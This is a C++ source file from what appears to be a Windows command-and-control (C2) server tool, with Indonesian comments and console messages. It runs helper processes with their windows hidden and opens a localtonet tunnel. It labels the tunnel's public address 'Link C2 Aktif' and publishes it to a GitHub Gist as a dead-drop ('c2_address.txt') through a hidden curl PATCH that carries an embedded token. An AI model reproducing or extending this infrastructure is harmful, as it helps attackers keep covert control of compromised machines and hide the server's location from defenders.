#include "../include/tunnel_manager.h"
#include "../include/common_state.h"
#include <fstream>
#include <thread>
#include <chrono>
#include <cstring>
#include <sstream>
#include "../include/ui_manager.h"

#ifdef _WIN32
#include <windows.h>
#include <psapi.h>
#endif

// Implementation of Helper Process execution (Zero-Window)
bool StartDetachedProcess(const std::string& cmdLine) {
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Pastikan tidak ada jendela muncul
    
    PROCESS_INFORMATION pi = {};

    std::string fullCmd = "cmd.exe /c \"" + cmdLine + "\"";
    char* cmdBuf = _strdup(fullCmd.c_str());

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        free(cmdBuf);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    free(cmdBuf);
    return false;
}

// Synchronous Helper Process execution (Zero-Window, Waits for exit)
bool RunHiddenProcessSync(const std::string& cmdLine) {
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {};
    std::string fullCmd = "cmd.exe /c \"" + cmdLine + "\"";
    char* cmdBuf = _strdup(fullCmd.c_str());

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        free(cmdBuf);
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return exitCode == 0;
    }
    free(cmdBuf);
    return false;
}

bool IsProcessRunning(const std::string& processName) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) return false;
    cProcesses = cbNeeded / sizeof(DWORD);
    for (unsigned int i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
            if (NULL != hProcess) {
                HMODULE hMod;
                DWORD cbNeeded2;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded2)) {
                    GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
                }
                CloseHandle(hProcess);
                if (processName == std::string(szProcessName)) return true;
            }
        }
    }
    return false;
}

void StartTunnelAndGetUrl(int port, std::string& public_url) {
    (void)port;
    
    // Clear old state for fresh start
    global_public_url = "None"; // Match common_state.cpp initial value
    global_gist_success = false;

    bool alreadyRunning = IsProcessRunning(LOCALTONET_EXE) || IsProcessRunning(SSH_EXE);
    if (alreadyRunning && !global_public_url.empty() && global_public_url != "None") {
        public_url = global_public_url;
        std::cout << SUCCESS_TAG << "Menggunakan Tunnel aktif: " << CYAN << public_url << RESET << std::endl;
        return;
    }

    std::cout << INFO_TAG << "Memulai Tunneling (Zero-Log Handshake)... " << std::endl;
    
    CleanupSystem(); // Aggressive cleanup
    std::this_thread::sleep_for(std::chrono::milliseconds(500));

    std::string localtonet_path = "tools\\" + std::string(LOCALTONET_EXE);
    std::string token = std::string(LOCALTONET_TOKEN);
    
    std::string cmd = localtonet_path;
    if (!token.empty() && token != "YOUR_TOKEN" && token != "2002202") {
        cmd += " --authtoken " + token;
    }

    // --- MEMORY-BASED HANDSHAKE (No Log Files) ---
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        std::cout << ERROR_TAG << "Gagal membuat pipe untuk handshake!" << std::endl;
        return;
    }

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    char* cmdBuf = _strdup(cmd.c_str());

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        free(cmdBuf);
        CloseHandle(hWrite); // Close write end in parent

        std::cout << INFO_TAG << "Menunggu Sinkronisasi Alamat (Handshake)... " << std::flush;
        
        bool success = false;
        std::string capturedOutput;
        char buffer[1024];
        DWORD bytesRead;
        
        auto start_time = std::chrono::steady_clock::now();
        while (true) {
            DWORD avail = 0;
            if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                if (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    capturedOutput += buffer;
                    
                    size_t pos = capturedOutput.find("ADDED");
                    if (pos != std::string::npos) {
                        size_t start = capturedOutput.find_first_not_of(" \t", pos + 5);
                        size_t end = capturedOutput.find("TCP", start);
                        if (start != std::string::npos && end != std::string::npos) {
                            public_url = capturedOutput.substr(start, end - start);
                            public_url.erase(public_url.find_last_not_of(" \n\r\t") + 1);
                            global_public_url = public_url;
                            std::cout << " [SIP]" << std::endl;
                            std::cout << SUCCESS_TAG << "Link C2 Aktif: " << CYAN << public_url << RESET << std::endl;
                            UpdateGitHubGist(public_url);
                            success = true;
                            break;
                        }
                    }
                }
            }

            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count() > 30) break;
            std::this_thread::sleep_for(std::chrono::milliseconds(50)); // Optimized delay
        }

        if (!success) {
            std::cout << " [GAGAL]" << std::endl;
            std::cout << ERROR_TAG << "Tunnel Handshake Gagal! Pastikan Token benar atau Koneksi stabil." << std::endl;
        }

        CloseHandle(hRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        free(cmdBuf);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        std::cout << ERROR_TAG << "Gagal menjalankan localtonet.exe!" << std::endl;
    }
}

std::string GetDetailedTunnelLogs() {
    return "Handshake performed via memory pipes. Current URL: " + global_public_url;
}

void UpdateGitHubGist(const std::string& public_url) {
    if (public_url.empty() || std::string(GIST_ID) == "YOUR_GIST_ID") return;
    
    std::string payload = "{\"files\": {\"c2_address.txt\": {\"content\": \"" + public_url + "\"}}}";
    std::string payloadPath = "gist_payload.json";
    std::ofstream out(payloadPath);
    out << payload;
    out.close();

    std::string cmd = "curl -X PATCH -H \"Accept: application/vnd.github.v3+json\" ";
    cmd += "-H \"Authorization: token " + std::string(GITHUB_TOKEN) + "\" ";
    cmd += "-d @gist_payload.json https://api.github.com/gists/" + std::string(GIST_ID) + " -s -o NUL";
    
    bool res = RunHiddenProcessSync(cmd);
    remove(payloadPath.c_str());
    global_gist_success = res;
    
    if (global_gist_success) {
        std::cout << SUCCESS_TAG << " Github Gist Cloud Database Synchronized: (" << public_url << ")" << std::endl;
    } else {
        std::cout << ERROR_TAG << " Gagal melakukan sinkronisasi dengan GitHub Gist!" << std::endl;
    }
}

void CleanupSystem() {
    RunHiddenProcessSync("taskkill /IM " + std::string(LOCALTONET_EXE) + " /F >NUL 2>&1");
    RunHiddenProcessSync("taskkill /IM ssh.exe /F >NUL 2>&1");
    global_public_url = "None";
}
